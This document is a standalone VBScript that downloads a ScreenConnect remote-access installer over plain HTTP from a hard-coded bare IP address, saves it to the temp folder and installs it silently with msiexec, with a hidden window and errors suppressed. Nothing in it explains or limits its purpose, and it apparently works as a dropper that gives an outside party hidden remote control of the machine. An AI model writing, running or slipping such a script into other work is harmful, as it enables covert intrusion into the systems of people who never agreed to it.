Option Explicit

Dim shell
Dim fso
Dim http
Dim stream
Dim tempPath
Dim msiUrl
Dim downloadPath
Dim logPath
Dim cmd
Dim exitCode
Dim q

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

q = Chr(34)

tempPath = shell.ExpandEnvironmentStrings("%TEMP%")

msiUrl = "http://162.35.100.246/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
downloadPath = tempPath & "\ScreenConnect.ClientSetup.msi"
logPath = tempPath & "\ScreenConnect_Install.log"

On Error Resume Next

If fso.FileExists(downloadPath) Then
    fso.DeleteFile downloadPath, True
End If

Set http = CreateObject("MSXML2.XMLHTTP")

http.Open "GET", msiUrl, False
http.Send

If Err.Number <> 0 Then
    WScript.Quit 1
End If

If http.Status <> 200 Then
    WScript.Quit 1
End If

Set stream = CreateObject("ADODB.Stream")

stream.Type = 1
stream.Open
stream.Write http.ResponseBody
stream.SaveToFile downloadPath, 2
stream.Close

If Err.Number <> 0 Then
    WScript.Quit 1
End If

On Error GoTo 0

cmd = "msiexec.exe /i " & q & downloadPath & q & _
      " /qn /norestart /l*v " & q & logPath & q

exitCode = shell.Run(cmd, 0, True)

WScript.Quit exitCode